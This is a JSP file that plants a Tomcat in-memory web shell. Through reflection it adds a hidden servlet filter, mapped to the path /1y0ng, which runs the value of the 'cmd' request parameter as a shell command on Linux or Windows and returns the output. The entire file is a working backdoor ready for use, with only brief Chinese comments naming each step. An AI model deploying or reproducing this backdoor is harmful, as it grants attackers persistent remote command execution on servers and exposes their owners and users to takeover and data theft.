<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Scanner" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    public class Shellfilter implements  Filter{
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }

        @Override
        public void destroy() {
        }
    }
%>
<%
    //拿到standardContext
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext =  (ApplicationContext) applicationField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext =  (StandardContext) standardContextField.get(applicationContext);

    //设置filterDef
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterClass(Shellfilter.class.getName());
    filterDef.setFilterName("Shellfilter");
    filterDef.setFilter(new Shellfilter());
    standardContext.addFilterDef(filterDef);

    //设置filterMap
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName("Shellfilter");
    filterMap.addURLPattern("/1y0ng");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMap(filterMap);

    //将standardContext和filterDef放到filterConfig中
    Class configclass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
    Constructor configconstructor = configclass.getDeclaredConstructor(Context.class,FilterDef.class);
    configconstructor.setAccessible(true);
    FilterConfig filterConfig = (FilterConfig) configconstructor.newInstance(standardContext,filterDef);

    //反射获取filterConfig
    Field configsfield = standardContext.getClass().getDeclaredField("filterConfigs");
    configsfield.setAccessible(true);
    Map filterConfigs = (Map) configsfield.get(standardContext);
    filterConfigs.put("Shellfilter",filterConfig);
%>
</body>
</html>
